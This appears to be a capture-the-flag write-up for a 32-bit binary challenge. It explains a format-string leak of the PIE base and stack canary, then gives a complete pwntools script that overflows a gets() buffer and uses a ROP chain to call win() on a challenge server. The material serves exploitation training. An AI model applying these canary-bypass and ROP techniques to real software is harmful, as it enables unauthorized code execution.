# Warden Challenge - Solution

## Challenge Info
- **Binary**: warden (32-bit ELF)
- **Protections**: PIE, NX, Stack Canary, RELRO
- **Server**: nc 14.225.212.104 9004

## Vulnerability Analysis

### 1. Find the Target
```bash
nm warden | grep win
# win() function exists at offset 0x1324
```

### 2. Check win() Requirements
```bash
objdump -d warden -M intel | grep -A 30 "<win>"
```
The win() function checks:
- `jinx == 0x1337`
- `mf == 0x420`
- `trex == 0xdeadbeef`
- Argument must be `0x123`

### 3. Find Helper Functions
```bash
nm warden | grep -E "braum|ornn|thress"
```
- `braum(arg)` → writes arg to `jinx`
- `ornn(arg)` → writes arg to `mf`
- `thress(arg)` → writes arg to `trex`

### 4. Identify Vulnerabilities
The `tft()` function has:
1. **Format string**: First `gets()` → `printf()` (no format string)
2. **Buffer overflow**: Second `gets()` into 32-byte buffer

## Exploitation Strategy

### Step 1: Leak Information (Format String)
The first `gets()`/`printf()` lets us leak:
- **PIE base**: Read code pointer from stack (`%3$08x`)
- **Stack canary**: Read canary value from stack (`%15$08x`)

```python
payload = b"%3$08x|%15$08x"
io.sendline(payload)
leak = io.recvline().decode()
code_ptr, canary = leak.strip().split('|')
code_ptr = int(code_ptr, 16)
canary = int(canary, 16)
```

### Step 2: Calculate Addresses
```python
# Code pointer is at tft+0x10, tft is at offset 0x11d5
base = code_ptr - 0x11e5

# Calculate all needed addresses
braum = base + 0x12cd
ornn = base + 0x12ea
thress = base + 0x1307
win = base + 0x1324
pop_ret = base + 0x1022  # Gadget: pop ebx; ret
```

### Step 3: Build ROP Chain (Buffer Overflow)
Stack layout: `[buffer:32][canary:4][ebx:4][ebp:4][return:4]`

```python
payload = flat([
    b'A' * 32,           # Fill buffer
    p32(canary),         # Preserve canary
    p32(0),              # Saved EBX (dummy)
    p32(0),              # Saved EBP (dummy)
    
    # ROP chain to set globals
    p32(braum),          # Call braum(0x1337)
    p32(pop_ret),        # Clean up argument
    p32(0x1337),         # Argument for braum
    
    p32(ornn),           # Call ornn(0x420)
    p32(pop_ret),        # Clean up argument
    p32(0x420),          # Argument for ornn
    
    p32(thress),         # Call thress(0xdeadbeef)
    p32(pop_ret),        # Clean up argument
    p32(0xdeadbeef),     # Argument for thress
    
    p32(win),            # Call win(0x123)
    p32(0),              # Return address (dummy)
    p32(0x123),          # Argument for win
])
```

### Step 4: Send and Get Flag
```python
io.sendline(payload)
io.interactive()  # Get the flag
```

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

# Connect
io = remote('14.225.212.104', 9004)

# Step 1: Leak PIE base and canary
io.sendlineafter(b'champion?', b'%3$08x|%15$08x')
leak = io.recvline().decode().strip()
code_ptr, canary = [int(x, 16) for x in leak.split('|')]

# Step 2: Calculate addresses
base = code_ptr - 0x11e5
braum = base + 0x12cd
ornn = base + 0x12ea
thress = base + 0x1307
win = base + 0x1324
pop_ret = base + 0x1022

# Step 3: Build ROP chain
payload = flat([
    b'A' * 32, p32(canary), p32(0), p32(0),
    p32(braum), p32(pop_ret), p32(0x1337),
    p32(ornn), p32(pop_ret), p32(0x420),
    p32(thress), p32(pop_ret), p32(0xdeadbeef),
    p32(win), p32(0), p32(0x123),
])

# Step 4: Exploit
io.sendline(payload)
io.interactive()
```

## Key Concepts Used

1. **Format String Vulnerability**: Leak stack data to bypass PIE and canary
2. **Stack Canary Bypass**: Read canary value and place it back in correct position
3. **PIE Bypass**: Leak code pointer to calculate base address
4. **ROP Chain**: Chain function calls with proper argument passing
5. **i386 Calling Convention**: Arguments pushed on stack, cleaned with `pop; ret`

## Run It
```bash
python3 exploit.py
```

The exploit will connect to the server, leak addresses, send the ROP chain, and retrieve the flag.
